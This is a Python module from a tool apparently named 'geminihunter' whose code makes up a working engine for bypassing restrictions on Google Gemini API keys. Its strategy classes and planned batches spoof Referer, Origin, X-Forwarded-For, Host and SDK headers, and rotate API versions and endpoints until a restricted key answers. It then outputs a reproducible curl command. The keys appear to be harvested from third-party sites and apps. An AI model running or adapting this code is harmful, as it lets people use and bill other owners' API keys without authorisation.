"""403 bypass engine with probe-based batches and legacy strategy classes."""

import asyncio
import json
import logging
from abc import ABC, abstractmethod
from dataclasses import dataclass, field
from typing import ClassVar
from urllib.parse import urlparse

import httpx

from geminihunter.models import BypassDetail
from geminihunter.network.session import SessionManager

logger = logging.getLogger("geminihunter")

GEMINI_BASE_URL = "https://generativelanguage.googleapis.com"

# --- Bypass data structures ---


@dataclass
class BypassAttempt:
    """A single bypass attempt configuration."""

    technique_name: str
    headers: dict[str, str] = field(default_factory=dict)
    api_version: str = "v1beta"
    endpoint: str = "models"
    method: str = "GET"
    body: str | None = None
    key_in_header: bool = False

    def to_url(self, key: str) -> str:
        base = f"{GEMINI_BASE_URL}/{self.api_version}/{self.endpoint}"
        if self.key_in_header:
            return base
        return f"{base}?key={key}"

    def to_curl(self, key: str) -> str:
        """Generate a curl command that reproduces this attempt."""
        url = self.to_url(key)
        parts = [f"curl -s -X {self.method}"]
        for k, v in self.headers.items():
            parts.append(f'-H "{k}: {v}"')
        if self.body:
            parts.append(f"-d '{self.body}'")
        parts.append(f'"{url}"')
        return " ".join(parts)

    def to_bypass_detail(self) -> BypassDetail:
        return BypassDetail(
            technique=self.technique_name,
            headers=dict(self.headers),
            api_version=self.api_version,
            endpoint=self.endpoint,
            method=self.method,
            body=self.body,
            curl_command="",  # Filled later with key
            key_in_header=self.key_in_header,
        )


# --- Strategy registry ---

_bypass_registry: list[type["BypassStrategy"]] = []


def bypass_strategy(cls: type["BypassStrategy"]) -> type["BypassStrategy"]:
    """Decorator to auto-register a bypass strategy."""
    _bypass_registry.append(cls)
    return cls


class BypassStrategy(ABC):
    """Base class for bypass techniques."""

    name: ClassVar[str]

    @abstractmethod
    def generate_attempts(self, key: str, target_domain: str) -> list[BypassAttempt]:
        ...


# --- Registered strategies ---


@bypass_strategy
class RefererGoogle(BypassStrategy):
    """Bypass with Google referrer headers."""

    name = "referer_google"

    REFERERS = [
        "https://www.google.com",
        "https://www.google.com/",
        "https://console.cloud.google.com",
        "https://aistudio.google.com",
        "https://makersuite.google.com",
        "https://ai.google.dev",
        "https://cloud.google.com",
    ]

    def generate_attempts(self, key: str, target_domain: str) -> list[BypassAttempt]:
        return [
            BypassAttempt(
                technique_name=f"{self.name}:{ref}",
                headers={"Referer": ref},
            )
            for ref in self.REFERERS
        ]


@bypass_strategy
class RefererTarget(BypassStrategy):
    """Bypass with target domain as referrer."""

    name = "referer_target"

    def generate_attempts(self, key: str, target_domain: str) -> list[BypassAttempt]:
        if not target_domain or target_domain == "direct":
            return []
        variants = [
            f"https://{target_domain}",
            f"https://{target_domain}/",
            f"https://www.{target_domain}",
            f"http://{target_domain}",
        ]
        return [
            BypassAttempt(
                technique_name=f"{self.name}:{ref}",
                headers={"Referer": ref},
            )
            for ref in variants
        ]


@bypass_strategy
class RefererCommon(BypassStrategy):
    """Bypass with common referrer values."""

    name = "referer_common"

    REFERERS = [
        "https://googleapis.com",
        "http://localhost",
        "http://localhost:3000",
        "http://localhost:8080",
        "http://127.0.0.1",
        "https://example.com",
        "",  # Empty referer
    ]

    def generate_attempts(self, key: str, target_domain: str) -> list[BypassAttempt]:
        return [
            BypassAttempt(
                technique_name=f"{self.name}:{ref or 'empty'}",
                headers={"Referer": ref} if ref else {},
            )
            for ref in self.REFERERS
        ]


@bypass_strategy
class OriginHeader(BypassStrategy):
    """Bypass using Origin header manipulation."""

    name = "origin_header"

    def generate_attempts(self, key: str, target_domain: str) -> list[BypassAttempt]:
        origins = [
            "https://www.google.com",
            "https://console.cloud.google.com",
            "https://aistudio.google.com",
            "null",  # Some servers allow null origin
        ]
        if target_domain and target_domain != "direct":
            origins.append(f"https://{target_domain}")

        return [
            BypassAttempt(
                technique_name=f"{self.name}:{origin}",
                headers={"Origin": origin},
            )
            for origin in origins
        ]


@bypass_strategy
class ForwardedForBypass(BypassStrategy):
    """Bypass using X-Forwarded-For / X-Real-IP with internal IPs."""

    name = "xff_bypass"

    INTERNAL_IPS = [
        "127.0.0.1",
        "10.0.0.1",
        "172.16.0.1",
        "192.168.1.1",
        "0.0.0.0",
        "::1",
    ]

    def generate_attempts(self, key: str, target_domain: str) -> list[BypassAttempt]:
        return [
            BypassAttempt(
                technique_name=f"{self.name}:{ip}",
                headers={
                    "X-Forwarded-For": ip,
                    "X-Real-IP": ip,
                },
            )
            for ip in self.INTERNAL_IPS
        ]


@bypass_strategy
class APIVersionBrute(BypassStrategy):
    """Bypass by trying different API versions."""

    name = "api_version"

    VERSIONS = ["v1", "v1beta", "v1beta2", "v1beta3"]

    def generate_attempts(self, key: str, target_domain: str) -> list[BypassAttempt]:
        return [
            BypassAttempt(
                technique_name=f"{self.name}:{ver}",
                api_version=ver,
            )
            for ver in self.VERSIONS
        ]


@bypass_strategy
class EndpointSwitch(BypassStrategy):
    """Bypass by trying different API endpoints."""

    name = "endpoint_switch"

    ENDPOINTS = [
        ("models", "GET", None),
        (
            "models/gemini-2.0-flash:generateContent",
            "POST",
            json.dumps({"contents": [{"parts": [{"text": "hi"}]}]}),
        ),
        (
            "models/embedding-001:embedContent",
            "POST",
            json.dumps(
                {
                    "model": "models/embedding-001",
                    "content": {"parts": [{"text": "test"}]},
                }
            ),
        ),
        (
            "models/gemini-2.0-flash:countTokens",
            "POST",
            json.dumps({"contents": [{"parts": [{"text": "test"}]}]}),
        ),
    ]

    def generate_attempts(self, key: str, target_domain: str) -> list[BypassAttempt]:
        attempts = []
        for endpoint, method, body in self.ENDPOINTS:
            headers = {}
            if body:
                headers["Content-Type"] = "application/json"
            attempts.append(
                BypassAttempt(
                    technique_name=f"{self.name}:{endpoint}",
                    endpoint=endpoint,
                    method=method,
                    body=body,
                    headers=headers,
                )
            )
        return attempts


@bypass_strategy
class MethodSwitch(BypassStrategy):
    """Bypass by switching HTTP method."""

    name = "method_switch"

    def generate_attempts(self, key: str, target_domain: str) -> list[BypassAttempt]:
        return [
            BypassAttempt(technique_name=f"{self.name}:POST", method="POST"),
            BypassAttempt(technique_name=f"{self.name}:OPTIONS", method="OPTIONS"),
            BypassAttempt(technique_name=f"{self.name}:HEAD", method="HEAD"),
        ]


@bypass_strategy
class ComboRefererVersion(BypassStrategy):
    """Combo: Google referer + different API versions."""

    name = "combo_referer_version"

    def generate_attempts(self, key: str, target_domain: str) -> list[BypassAttempt]:
        attempts = []
        referers = [
            "https://www.google.com",
            "https://aistudio.google.com",
        ]
        versions = ["v1", "v1beta", "v1beta2", "v1beta3"]

        for ref in referers:
            for ver in versions:
                attempts.append(
                    BypassAttempt(
                        technique_name=f"{self.name}:{ref}+{ver}",
                        headers={"Referer": ref},
                        api_version=ver,
                    )
                )
        return attempts


@bypass_strategy
class ComboRefererEndpoint(BypassStrategy):
    """Combo: Google referer + generateContent endpoint."""

    name = "combo_referer_endpoint"

    def generate_attempts(self, key: str, target_domain: str) -> list[BypassAttempt]:
        body = json.dumps({"contents": [{"parts": [{"text": "hi"}]}]})
        referers = [
            "https://www.google.com",
            "https://aistudio.google.com",
            "https://console.cloud.google.com",
        ]
        return [
            BypassAttempt(
                technique_name=f"{self.name}:{ref}+generateContent",
                headers={
                    "Referer": ref,
                    "Content-Type": "application/json",
                },
                endpoint="models/gemini-2.0-flash:generateContent",
                method="POST",
                body=body,
            )
            for ref in referers
        ]


@bypass_strategy
class ApiKeyHeader(BypassStrategy):
    """Bypass by sending key via x-goog-api-key header instead of query param."""

    name = "api_key_header"

    def generate_attempts(self, key: str, target_domain: str) -> list[BypassAttempt]:
        return [
            BypassAttempt(
                technique_name=f"{self.name}:{ver}",
                headers={"x-goog-api-key": key},
                api_version=ver,
                key_in_header=True,
            )
            for ver in ("v1beta", "v1", "v1beta2", "v1beta3")
        ]


@bypass_strategy
class StreamEndpoint(BypassStrategy):
    """Bypass by targeting the streaming endpoint."""

    name = "stream_endpoint"

    def generate_attempts(self, key: str, target_domain: str) -> list[BypassAttempt]:
        body = json.dumps({"contents": [{"parts": [{"text": "hi"}]}]})
        return [
            BypassAttempt(
                technique_name=f"{self.name}:{ver}",
                endpoint="models/gemini-2.0-flash:streamGenerateContent",
                method="POST",
                body=body,
                headers={"Content-Type": "application/json"},
                api_version=ver,
            )
            for ver in ("v1beta", "v1")
        ]


@bypass_strategy
class AlternateEndpoints(BypassStrategy):
    """Bypass by trying less common API endpoints."""

    name = "alt_endpoint"

    ENDPOINTS = [
        "tunedModels",
        "cachedContents",
        "files",
        "corpora",
    ]

    def generate_attempts(self, key: str, target_domain: str) -> list[BypassAttempt]:
        return [
            BypassAttempt(
                technique_name=f"{self.name}:{ep}",
                endpoint=ep,
            )
            for ep in self.ENDPOINTS
        ]


@bypass_strategy
class ComboApiKeyHeaderReferer(BypassStrategy):
    """Combo: x-goog-api-key header + Referer + Origin (triple bypass)."""

    name = "combo_header_referer"

    def generate_attempts(self, key: str, target_domain: str) -> list[BypassAttempt]:
        referers = [
            "https://aistudio.google.com",
            "https://console.cloud.google.com",
            "https://ai.google.dev",
        ]
        attempts = []
        for ref in referers:
            attempts.append(
                BypassAttempt(
                    technique_name=f"{self.name}:{ref}",
                    headers={
                        "x-goog-api-key": key,
                        "Referer": ref,
                        "Origin": ref,
                    },
                    key_in_header=True,
                )
            )
            # Also try with generateContent
            body = json.dumps({"contents": [{"parts": [{"text": "hi"}]}]})
            attempts.append(
                BypassAttempt(
                    technique_name=f"{self.name}:{ref}+generateContent",
                    headers={
                        "x-goog-api-key": key,
                        "Referer": ref,
                        "Origin": ref,
                        "Content-Type": "application/json",
                    },
                    endpoint="models/gemini-2.0-flash:generateContent",
                    method="POST",
                    body=body,
                    key_in_header=True,
                )
            )
        return attempts


@bypass_strategy
class SdkHeaders(BypassStrategy):
    """Bypass by mimicking official Google SDK client headers."""

    name = "sdk_headers"

    SDK_CLIENTS = [
        "genai-js/0.21.0",
        "gl-python/3.12.0 grpc/1.62.0 gax/2.24.0",
        "genai-go/0.7.0",
    ]

    def generate_attempts(self, key: str, target_domain: str) -> list[BypassAttempt]:
        return [
            BypassAttempt(
                technique_name=f"{self.name}:{client.split('/')[0]}",
                headers={"X-Goog-Api-Client": client},
            )
            for client in self.SDK_CLIENTS
        ]


@bypass_strategy
class SdkUserAgent(BypassStrategy):
    """Bypass by using official Google SDK User-Agent strings."""

    name = "sdk_ua"

    SDK_AGENTS = [
        "google-api-python-client/2.149.0 (gzip)",
        "gl-python/3.12 google-cloud-sdk/0.1",
        "google-api-nodejs-client/9.14.0",
    ]

    def generate_attempts(self, key: str, target_domain: str) -> list[BypassAttempt]:
        return [
            BypassAttempt(
                technique_name=f"{self.name}:{ua.split('/')[0]}",
                headers={"User-Agent": ua},
            )
            for ua in self.SDK_AGENTS
        ]


# --- Bypass engine ---


BYPASS_TIMEOUT = 1.5
TOTAL_BYPASS_BUDGET = 4.0
GOOGLE_WEB_ORIGINS = [
    "https://aistudio.google.com",
    "https://console.cloud.google.com",
    "https://ai.google.dev",
    "https://makersuite.google.com",
    "https://www.google.com",
]
COMMON_REFERERS = [
    "127.0.0.1",
    "localhost",
    "http://127.0.0.1",
    "http://127.0.0.1/",
    "http://localhost",
    "http://localhost:3000",
    "http://localhost:8080",
    "https://googleapis.com",
    "https://example.com",
]
PRIORITY_MODELS = [
    "gemini-2.0-flash",
    "gemini-2.0-flash-lite",
    "gemini-1.5-flash",
    "gemini-1.5-pro",
]
SDK_CLIENT_HEADERS = [
    {"X-Goog-Api-Client": "genai-js/0.21.0"},
    {"X-Goog-Api-Client": "gl-python/3.12.0 grpc/1.62.0 gax/2.24.0"},
    {"X-Goog-Api-Client": "genai-go/0.7.0"},
]
SDK_USER_AGENTS = [
    {"User-Agent": "google-api-python-client/2.149.0 (gzip)"},
    {"User-Agent": "gl-python/3.12 google-cloud-sdk/0.1"},
    {"User-Agent": "google-api-nodejs-client/9.14.0"},
]


def _is_http_url(value: str) -> bool:
    return value.startswith(("http://", "https://"))


def _registrable_domain(host: str) -> str:
    parts = host.split(".")
    if len(parts) >= 3 and parts[-2] in {"co", "com", "org", "net", "gov", "ac", "edu"}:
        return ".".join(parts[-3:])
    if len(parts) >= 2:
        return ".".join(parts[-2:])
    return host


def _dedupe_keep_order(values: list[str]) -> list[str]:
    seen: set[str] = set()
    out: list[str] = []
    for value in values:
        if value and value not in seen:
            seen.add(value)
            out.append(value)
    return out


def google_error_reason(resp: httpx.Response) -> str | None:
    """Extract Google RPC ErrorInfo.reason from an error response."""
    try:
        payload = resp.json()
    except ValueError:
        return None

    details = payload.get("error", {}).get("details", [])
    if not isinstance(details, list):
        return None

    for detail in details:
        if not isinstance(detail, dict):
            continue
        reason = detail.get("reason")
        if isinstance(reason, str):
            return reason
    return None


def _build_browser_headers(
    origin: str | None = None,
    referer: str | None = None,
    host_override: str | None = None,
    extra: dict[str, str] | None = None,
) -> dict[str, str]:
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "cross-site",
    }
    if origin:
        headers["Origin"] = origin
    if referer:
        headers["Referer"] = referer
        if origin and referer.startswith(origin):
            headers["Sec-Fetch-Site"] = "same-origin"
    if host_override:
        headers["Host"] = host_override
        headers["X-Forwarded-Host"] = host_override
        headers["X-Forwarded-Proto"] = "https"
        headers["Forwarded"] = f"host={host_override};proto=https"
    if extra:
        headers.update(extra)
    return headers


def _content_body(text: str = "hi") -> str:
    return json.dumps({"contents": [{"parts": [{"text": text}]}]})


def _embed_body() -> str:
    return json.dumps(
        {
            "model": "models/embedding-001",
            "content": {"parts": [{"text": "test"}]},
        }
    )


class BypassEngine:
    """Runs probe-based bypass batches against a 403'd key."""

    def __init__(self, strategies: list[BypassStrategy] | None = None):
        if strategies is None:
            self.strategies = [cls() for cls in _bypass_registry]
        else:
            self.strategies = strategies

    def _candidate_domains(
        self,
        target_domain: str,
        target_domains: list[str] | None,
        source_urls: list[str] | None,
    ) -> list[str]:
        domains: list[str] = []
        for domain in (target_domains or []) + [target_domain]:
            if domain and domain not in {"direct", "apk"}:
                domains.append(domain)
        for url in source_urls or []:
            if not _is_http_url(url):
                continue
            host = urlparse(url).hostname
            if host:
                domains.extend([host, _registrable_domain(host)])
        expanded: list[str] = []
        for domain in _dedupe_keep_order(domains):
            expanded.append(domain)
            root = _registrable_domain(domain)
            for prefix in ("app", "api", "www", "m"):
                candidate = f"{prefix}.{root}"
                if candidate != domain:
                    expanded.append(candidate)
        return _dedupe_keep_order(expanded)[:12]

    def _candidate_contexts(
        self,
        domains: list[str],
        source_urls: list[str] | None,
    ) -> tuple[list[str], list[str]]:
        origins: list[str] = []
        referers: list[str] = []

        for url in source_urls or []:
            if not _is_http_url(url):
                continue
            parsed = urlparse(url)
            if not parsed.hostname:
                continue
            origin = f"{parsed.scheme}://{parsed.netloc}"
            origins.append(origin)
            referers.append(url)
            referers.append(f"{origin}/")

        for domain in domains:
            origins.append(f"https://{domain}")
            referers.append(f"https://{domain}/")

        origins.extend(GOOGLE_WEB_ORIGINS)
        referers.extend(f"{origin}/" for origin in GOOGLE_WEB_ORIGINS)
        return _dedupe_keep_order(origins)[:12], _dedupe_keep_order(referers)[:16]

    def _attempt(
        self,
        technique_name: str,
        headers: dict[str, str] | None = None,
        api_version: str = "v1beta",
        endpoint: str = "models",
        method: str = "GET",
        body: str | None = None,
        key_in_header: bool = False,
    ) -> BypassAttempt:
        return BypassAttempt(
            technique_name=technique_name,
            headers=headers or {},
            api_version=api_version,
            endpoint=endpoint,
            method=method,
            body=body,
            key_in_header=key_in_header,
        )

    def _dedupe_attempts(self, attempts: list[BypassAttempt]) -> list[BypassAttempt]:
        seen: set[tuple] = set()
        unique: list[BypassAttempt] = []
        for attempt in attempts:
            fingerprint = (
                attempt.method,
                attempt.api_version,
                attempt.endpoint,
                attempt.body or "",
                attempt.key_in_header,
                tuple(sorted(attempt.headers.items())),
            )
            if fingerprint not in seen:
                seen.add(fingerprint)
                unique.append(attempt)
        return unique

    def _classification_probes(
        self,
        domains: list[str],
        origins: list[str],
        referers: list[str],
    ) -> list[BypassAttempt]:
        origin = origins[0] if origins else None
        referer = referers[0] if referers else None
        domain = domains[0] if domains else None
        probes = [
            self._attempt(
                "probe:browser-ref-models",
                headers=_build_browser_headers(origin, referer),
            ),
            self._attempt(
                "probe:header-browser-models",
                headers=_build_browser_headers(origin, referer),
                key_in_header=True,
            ),
            self._attempt(
                "probe:query-generate",
                headers={"Content-Type": "application/json"},
                endpoint=f"models/{PRIORITY_MODELS[0]}:generateContent",
                method="POST",
                body=_content_body(),
            ),
            self._attempt(
                "probe:query-browser-generate",
                headers=_build_browser_headers(
                    origin,
                    referer,
                    domain,
                    extra={"Content-Type": "application/json"},
                ),
                endpoint=f"models/{PRIORITY_MODELS[0]}:generateContent",
                method="POST",
                body=_content_body(),
            ),
        ]
        return self._dedupe_attempts(probes)

    def _contextual_referrer_attempts(
        self,
        domains: list[str],
        origins: list[str],
        referers: list[str],
        key_in_header: bool,
    ) -> list[BypassAttempt]:
        attempts: list[BypassAttempt] = []
        for origin, referer in zip(origins[:8], referers[:8]):
            attempts.append(
                self._attempt(
                    f"browser:models:{referer}",
                    headers=_build_browser_headers(origin, referer),
                    key_in_header=key_in_header,
                )
            )
            for model in PRIORITY_MODELS[:2]:
                attempts.append(
                    self._attempt(
                        f"browser:generate:{model}:{referer}",
                        headers=_build_browser_headers(
                            origin,
                            referer,
                            extra={"Content-Type": "application/json"},
                        ),
                        endpoint=f"models/{model}:generateContent",
                        method="POST",
                        body=_content_body(),
                        key_in_header=key_in_header,
                    )
                )
                attempts.append(
                    self._attempt(
                        f"browser:count:{model}:{referer}",
                        headers=_build_browser_headers(
                            origin,
                            referer,
                            extra={"Content-Type": "application/json"},
                        ),
                        endpoint=f"models/{model}:countTokens",
                        method="POST",
                        body=_content_body("tokenize"),
                        key_in_header=key_in_header,
                    )
                )
        for domain in domains[:6]:
            origin = f"https://{domain}"
            referer = f"{origin}/"
            attempts.append(
                self._attempt(
                    f"origin-only:{domain}",
                    headers=_build_browser_headers(origin, referer),
                    key_in_header=key_in_header,
                )
            )
        return self._dedupe_attempts(attempts)

    def _common_referrer_attempts(self, key_in_header: bool) -> list[BypassAttempt]:
        attempts: list[BypassAttempt] = []
        for referer in COMMON_REFERERS:
            headers = {"Referer": referer}
            attempts.append(
                self._attempt(
                    f"common-referer:models:{referer}",
                    headers=headers,
                    key_in_header=key_in_header,
                )
            )
            attempts.append(
                self._attempt(
                    f"common-referer:files:{referer}",
                    headers=headers,
                    endpoint="files",
                    key_in_header=key_in_header,
                )
            )
        return self._dedupe_attempts(attempts)

    def _host_override_attempts(
        self,
        domains: list[str],
        origins: list[str],
        referers: list[str],
        key_in_header: bool,
    ) -> list[BypassAttempt]:
        attempts: list[BypassAttempt] = []
        origin = origins[0] if origins else None
        referer = referers[0] if referers else None
        for domain in domains[:6]:
            attempts.append(
                self._attempt(
                    f"host-override:{domain}",
                    headers=_build_browser_headers(origin, referer, host_override=domain),
                    key_in_header=key_in_header,
                )
            )
            attempts.append(
                self._attempt(
                    f"host-override-generate:{domain}",
                    headers=_build_browser_headers(
                        origin,
                        referer,
                        host_override=domain,
                        extra={"Content-Type": "application/json"},
                    ),
                    endpoint=f"models/{PRIORITY_MODELS[0]}:generateContent",
                    method="POST",
                    body=_content_body(),
                    key_in_header=key_in_header,
                )
            )
        return self._dedupe_attempts(attempts)

    def _sdk_attempts(
        self,
        origins: list[str],
        referers: list[str],
        key_in_header: bool,
    ) -> list[BypassAttempt]:
        attempts: list[BypassAttempt] = []
        origin = origins[0] if origins else None
        referer = referers[0] if referers else None
        for extra in SDK_CLIENT_HEADERS + SDK_USER_AGENTS:
            attempts.append(
                self._attempt(
                    f"sdk:models:{next(iter(extra.values()))}",
                    headers=_build_browser_headers(origin, referer, extra=extra),
                    key_in_header=key_in_header,
                )
            )
            attempts.append(
                self._attempt(
                    f"sdk:generate:{next(iter(extra.values()))}",
                    headers=_build_browser_headers(
                        origin,
                        referer,
                        extra={**extra, "Content-Type": "application/json"},
                    ),
                    endpoint=f"models/{PRIORITY_MODELS[0]}:generateContent",
                    method="POST",
                    body=_content_body(),
                    key_in_header=key_in_header,
                )
            )
        return self._dedupe_attempts(attempts)

    def _endpoint_matrix_attempts(self, key_in_header: bool) -> list[BypassAttempt]:
        attempts: list[BypassAttempt] = []
        for api_version in ("v1beta", "v1"):
            attempts.append(
                self._attempt(
                    f"endpoint:models:{api_version}",
                    api_version=api_version,
                    key_in_header=key_in_header,
                )
            )
            for model in PRIORITY_MODELS:
                attempts.append(
                    self._attempt(
                        f"endpoint:generate:{api_version}:{model}",
                        headers={"Content-Type": "application/json"},
                        api_version=api_version,
                        endpoint=f"models/{model}:generateContent",
                        method="POST",
                        body=_content_body(),
                        key_in_header=key_in_header,
                    )
                )
                attempts.append(
                    self._attempt(
                        f"endpoint:count:{api_version}:{model}",
                        headers={"Content-Type": "application/json"},
                        api_version=api_version,
                        endpoint=f"models/{model}:countTokens",
                        method="POST",
                        body=_content_body("tokenize"),
                        key_in_header=key_in_header,
                    )
                )
            attempts.append(
                self._attempt(
                    f"endpoint:stream:{api_version}",
                    headers={"Content-Type": "application/json"},
                    api_version=api_version,
                    endpoint=f"models/{PRIORITY_MODELS[0]}:streamGenerateContent",
                    method="POST",
                    body=_content_body(),
                    key_in_header=key_in_header,
                )
            )
            attempts.append(
                self._attempt(
                    f"endpoint:embed:{api_version}",
                    headers={"Content-Type": "application/json"},
                    api_version=api_version,
                    endpoint="models/embedding-001:embedContent",
                    method="POST",
                    body=_embed_body(),
                    key_in_header=key_in_header,
                )
            )
        return self._dedupe_attempts(attempts)

    def _planned_batches(
        self,
        domains: list[str],
        origins: list[str],
        referers: list[str],
        probe_statuses: dict[str, int],
    ) -> list[list[BypassAttempt]]:
        likely_referrer = probe_statuses.get("probe:browser-ref-models") in (200, 429)
        header_bias = probe_statuses.get("probe:header-browser-models") in (200, 429)
        endpoint_bias = any(
            probe_statuses.get(name) in (200, 429)
            for name in ("probe:query-generate", "probe:query-browser-generate")
        )

        auth_modes = [header_bias] if likely_referrer or header_bias else [False, True]
        batches: list[list[BypassAttempt]] = []

        for idx, prefer_header in enumerate(auth_modes):
            key_in_header = prefer_header
            batches.append(self._common_referrer_attempts(key_in_header))
            batches.append(
                self._contextual_referrer_attempts(
                    domains,
                    origins[:6] if likely_referrer else origins[:4],
                    referers if likely_referrer or idx == 0 else referers[:4],
                    key_in_header,
                )
            )
            if likely_referrer:
                batches.append(
                    self._host_override_attempts(
                        domains[:4], origins[:4], referers[:4], key_in_header
                    )
                )
            if header_bias or prefer_header:
                batches.append(self._sdk_attempts(origins[:3], referers[:3], key_in_header))
            if endpoint_bias or not likely_referrer:
                batches.append(self._endpoint_matrix_attempts(key_in_header))

        return [self._dedupe_attempts(batch) for batch in batches if batch]

    async def _run_attempt_batch(
        self,
        key: str,
        attempts: list[BypassAttempt],
        client: httpx.AsyncClient,
        session: SessionManager,
        concurrency: int,
        time_budget: float,
        initial_reason: str | None = None,
    ) -> tuple[BypassDetail | None, dict[str, int]]:
        if time_budget <= 0:
            return None, {}
        sem = asyncio.Semaphore(concurrency)
        found: asyncio.Event = asyncio.Event()
        winner: list[tuple[BypassAttempt, int]] = []
        permission_progress: list[tuple[BypassAttempt, int, str]] = []
        statuses: dict[str, int] = {}

        def render_detail(
            attempt: BypassAttempt,
            status_code: int,
            error_reason: str | None = None,
        ) -> BypassDetail:
            detail = attempt.to_bypass_detail()
            rendered = BypassAttempt(
                technique_name=attempt.technique_name,
                headers={
                    **{
                        k: v
                        for k, v in attempt.headers.items()
                        if k.lower() != "x-goog-api-key"
                    },
                    **({"x-goog-api-key": key} if attempt.key_in_header else {}),
                },
                api_version=attempt.api_version,
                endpoint=attempt.endpoint,
                method=attempt.method,
                body=attempt.body,
                key_in_header=attempt.key_in_header,
            )
            detail.headers = rendered.headers
            detail.curl_command = rendered.to_curl(key)
            detail.bypass_status_code = status_code
            detail.error_reason = error_reason
            return detail

        async def try_attempt(attempt: BypassAttempt) -> None:
            if found.is_set():
                return
            async with sem:
                if found.is_set():
                    return
                try:
                    url = attempt.to_url(key)
                    headers = dict(attempt.headers)
                    if attempt.key_in_header:
                        headers["x-goog-api-key"] = key
                    resp = await session.fetch(
                        client,
                        url,
                        method=attempt.method,
                        headers=headers,
                        data=attempt.body,
                        timeout=BYPASS_TIMEOUT,
                        max_retries=1,
                        retry_on_429=False,
                    )
                    if resp is None:
                        return
                    statuses[attempt.technique_name] = resp.status_code
                    if resp.status_code in (200, 429):
                        winner.append((attempt, resp.status_code))
                        found.set()
                    elif (
                        resp.status_code == 403
                        and initial_reason == "API_KEY_HTTP_REFERRER_BLOCKED"
                        and google_error_reason(resp) == "SERVICE_DISABLED"
                    ):
                        permission_progress.append(
                            (attempt, resp.status_code, "SERVICE_DISABLED")
                        )
                except (httpx.HTTPError, Exception):
                    pass

        tasks = [asyncio.create_task(try_attempt(a)) for a in attempts]
        found_waiter = asyncio.create_task(found.wait())
        all_done = asyncio.ensure_future(asyncio.gather(*tasks, return_exceptions=True))
        try:
            await asyncio.wait(
                {found_waiter, all_done},
                timeout=min(BYPASS_TIMEOUT + 0.5, time_budget),
                return_when=asyncio.FIRST_COMPLETED,
            )
        finally:
            found_waiter.cancel()
            for task in tasks:
                if not task.done():
                    task.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)

        if winner:
            attempt, status_code = winner[0]
            return render_detail(attempt, status_code), statuses

        if permission_progress:
            attempt, status_code, reason = permission_progress[0]
            return render_detail(attempt, status_code, reason), statuses

        return None, statuses

    async def run(
        self,
        key: str,
        target_domain: str,
        client: httpx.AsyncClient,
        session: SessionManager,
        source_urls: list[str] | None = None,
        target_domains: list[str] | None = None,
        concurrency: int = 10,
        initial_reason: str | None = None,
    ) -> BypassDetail | None:
        """Run probe-based bypass batches and stop on first useful result."""
        domains = self._candidate_domains(target_domain, target_domains, source_urls)
        origins, referers = self._candidate_contexts(domains, source_urls)
        started = asyncio.get_running_loop().time()

        def remaining_budget() -> float:
            elapsed = asyncio.get_running_loop().time() - started
            return max(0.0, TOTAL_BYPASS_BUDGET - elapsed)

        probe_winner, probe_statuses = await self._run_attempt_batch(
            key,
            self._classification_probes(domains, origins, referers),
            client,
            session,
            concurrency=min(concurrency, 4),
            time_budget=min(remaining_budget(), 1.8),
            initial_reason=initial_reason,
        )
        if probe_winner:
            return probe_winner

        for batch in self._planned_batches(domains, origins, referers, probe_statuses):
            budget = remaining_budget()
            if budget <= 0:
                break
            winner, _ = await self._run_attempt_batch(
                key,
                batch,
                client,
                session,
                concurrency=min(concurrency, 6),
                time_budget=budget,
                initial_reason=initial_reason,
            )
            if winner:
                return winner
        return None
